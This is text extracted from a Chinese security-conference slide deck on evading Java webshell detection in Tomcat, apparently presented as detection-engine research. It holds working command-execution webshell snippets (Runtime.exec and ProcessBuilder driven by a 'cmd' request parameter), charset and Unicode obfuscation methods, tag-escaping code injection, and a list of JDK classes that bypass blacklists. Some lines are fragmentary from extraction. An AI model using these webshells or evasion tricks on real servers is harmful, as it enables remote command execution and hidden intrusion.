刘镇东（yzddMr6），阿里云安全工程师
ØAntSword开发组核心成员，开源工具As-Exploits、WebCrack、webshell-venom作者
Ø目前主要从事Webshell攻防研究，以及阿里云恶意文本检测引擎的建设
ØGithub: yzddMr6
ØBlog: yzddmr6.com
ØCTF: L3H_Sec
• Webshell通常是打开权限大门的第一块“破门砖”
• Java Webshell在攻防演练中占据着重要的地位
• 随着各类防护设备不断升级，如何逃避检测成为攻击者最关心的问题
l Tomcat解析篇
l 危险类篇
l 流量对抗篇
令人头疼的编码
Tomcat解析篇
• Jsp中可以⽤Unicode或者变形Unicode(\uuuuuuxxxx)这种格式来对恶意代码进⾏混淆
• 如果Webshell检测引擎没有对其进行正确的解码处理，就会被直接“降维打击”，产生绕过
• 这种简单、通用的混淆方式已经被攻击者广泛使用，大部分安全设备也已经支持检测
Q：为什么支持Unicode的写法？
A：Javac/ecj在底层解析字符的时候支持Unicode编码
Q：为什么支持\uuuuu这种格式？
A：解析过程中只要‘\’的下一个字符是‘u’ 编译器就会一直继续循环，读取下一个字符
do {
bp++; //读取下一个字符
ch = buf[bp];
} while (ch == ‘u’);//只要‘\’的下一个字符是u，就会一直继续循环
•
Javac：com.sun.tools.javac.parser.UnicodeReader#convertUnicode
•
ecj：org.eclipse.jdt.internal.compiler.parser.Scanner#getNextUnicodeChar
这种简单、有效的通杀混淆方式让我们着迷，同时也引起我们的思考：
是否还存在其他的“降维打击”方式？
• Tomcat内部支持了很多小众的字符集编码
• 如果检测引擎不支持这些字符集，对其而言就是一堆无法识别的乱码
• 用这些特殊的字符集来构造Webshell，就可以实现“降维打击”
Tomcat对于编码的解析过程
org.apache.jasper.compiler.ParserController#doParse
(开始页面解析)
org.apache.jasper.compiler.ParserController
#determineSyntaxAndEncoding
(分析文件编码)
org.apache.jasper.compiler.EncodingDetector
(Jspx: 通过BOM头判断编码)
org.apache.jasper.compiler.ParserController
#getPageEncodingForJspSyntax
(Jsp 从声明中提取编码类型)
UTF-8
(默认值)
ISO-8859-1
(默认值)
Encoding
b0
b1
b2
b3
UTF-16LE
0xFF
0xFE
*
*
UTF-16LE
0x3C
0x00
0x3F
0x00
UTF-16BE
0xFE
0xFF
*
*
UTF-16BE
0x00
0x3C
0x00
0x3F
ISO-10646-
UCS-4
0x00
0x00
0x00
0x3C
ISO-10646-
UCS-4
0x3C
0x00
0x00
0x00
ISO-10646-
UCS-4
0x00
0x00
0x3C
0x00
ISO-10646-
UCS-4
0x00
0x3C
0x00
0x00
CP037
0x4C
0x6F
0xA7
0x94
编码前
Runtime.getRuntime().exec(request.getParameter("cmd"));
编码后
• 除了通过Bom头可以识别的几种内置编码以外，在Jsp中还可以通过标签来
显式声明指定的编码，大大扩展了我们可利用编码的范围
• Jsp中声明编码的四种形式
1. 
2. 
3. 
4. 
Q：Tomcat到底支持多少编码？
A：JDK8+Tomcat8.5下底层共支持900多种编码
Q：有多少编码可以被利用？
A：我们对这些编码进行逐个分析，并进行归一化处理，
共发现十余种可以被用来构造混淆Webshell的编码
• 单字节编码：cp037、cp290等
• 2或4字节编码：utf-16le， utf-16be等
• 4字节编码：utf-32le、utf-32be等
原始样本
编码后
可以被Tomcat解析执行
Java的字符集是支持别名的，也就是说以下这
些alias都等价于cp290，都可以用于Webshell
的变形：
•
ibm290
•
ibm-290
•
csIBM290
•
EBCDIC-JP-kana
•
290
• 在对JDK底层支持编码的分析过程中，我们发现了一个潜藏于JDK中数十年的编码转换BUG
• 该BUG在最新的JDK19中仍可复现，提交给JDK官方后，截至目前已经修复完毕
神奇的标签操作
Tomcat解析篇
• Jsp在被Tomcat加载到内存里之前，还要经过一层标签解析转换的阶段
• 利用标签解析转换的特性，可以构造出一些几乎不可读的混淆样本
• 如果检测引擎不能正确处理，我们就可以实现“降维打击”
Jsp被加载到内存里主要分为三个阶段：
从Jsp文件中提取
所有需要的信息
将信息填充到
Java模板文件中
编译Java文件
生成class并加载
org.apache.jasper.compiler.Compiler
#generateJava
org.apache.jasper.compiler.Compiler
#generateClass
关注重点
•
Jsp虽然不符合语法结构，但是嵌套后的Java文件前
后括号闭合了，也就可以被正常的编译解析
• Jsp在处理setProperty，useBean等属性
的时候没有对名称进行转义，导致在渲染模
板的时候可以代码逃逸
• 插进去的文本可以利用前后注释闭合，打
破检测引擎的语法结构分析
() {public 
String get() { try{String s = request.getParameter(\"cmd\");Process process = 
new ProcessBuilder().command(s.split(\" \")).start();} catch (Exception e) 
{ e.printStackTrace();}return \"\";}}.get() + \"" property="*"/>
org.apache.jasper.runtime.JspRuntimeLibrary.introspect(_jspx_page_context.f
indAttribute("" + new java.util.function.Supplier() {public String
get() { try{String s = request.getParameter("cmd");Process process = new
ProcessBuilder().command(s.split(" ")).start();} catch (Exception e) 
{ e.printStackTrace();}return "";}}.get() + ""), request);
Jsp
渲染为Java后
TIPS：文件上传场景可用于绕过对
java.lang.Class a;java.lang.Runtime.getRuntime().exec(request.getParameter("cmd"));/* = null;
a;java.lang.Runtime.getRuntime().exec(request.getParameter("cmd"));/* = (java.lang.Class) 
_jspx_page_context.getAttribute("a;java.lang.Runtime.getRuntime().exec(request.getParameter(\"cmd\"));/*", 
javax.servlet.jsp.PageContext.PAGE_SCOPE);
if (a;java.lang.Runtime.getRuntime().exec(request.getParameter("cmd"));/* == null){...}
out.write('\n');
org.apache.jasper.runtime.JspRuntimeLibrary.introspect(_jspx_page_context.findAttribute(""*/ //"), request);
Jsp
渲染为Java后
•
Tomcat在识别Jspx文件后，会调用XML解析器来解析标签
•
可以利用XML字符串相关特性来实现绕过：HTML实体编码(hex、dec)、CDATA、...
me.getRuntime().exec(request.getParameter("test"));
第一层：反射方法
危险类篇
•
Java是一门面向对象的语言，在Java的底层存
在着各种复杂的调用
•
对于任意一个可以用来RCE的类，我们可以查
找他的底层实现类跟上层包装类
•
调用一个不存在在黑名单里面的类方法，就可
以绕过检测引擎
java.lang.Runtime#exec -> 
•
sun.net.www.MimeLauncher#run
•
sun.security.krb5.internal.ccache.FileCredentialsCache#exec
•
com.sun.corba.se.impl.activation.ServerTableEntry#verify
思考
•
大多数函数方法修饰符是非Public的，会有比
较明显的反射调用函数的特征，增加被发现的
风险
•
除了直接的Runtime#exec以外，是否还可以
利用其他的命令执行类？
任意命令
执行